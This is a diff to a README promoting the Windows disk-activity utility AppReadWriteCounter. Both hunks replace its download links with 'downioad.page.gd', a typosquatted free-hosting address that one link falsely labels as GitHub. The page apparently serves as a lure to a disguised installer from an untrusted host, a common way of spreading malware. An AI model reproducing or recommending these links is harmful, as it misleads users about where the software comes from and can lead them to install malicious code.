@@ -2,7 +2,7 @@
 
 AppReadWriteCounter is an essential utility for Windows users seeking to understand and manage disk read/write activities on their system. By providing detailed insights into how each application interacts with storage, it empowers users to optimize performance, identify bottlenecks, and maintain system health in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -60,7 +60,7 @@ Here are answers to some common queries about AppReadWriteCounter:
 
 Ready to enhance your system monitoring? Click the link below to access the latest version of AppReadWriteCounter.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
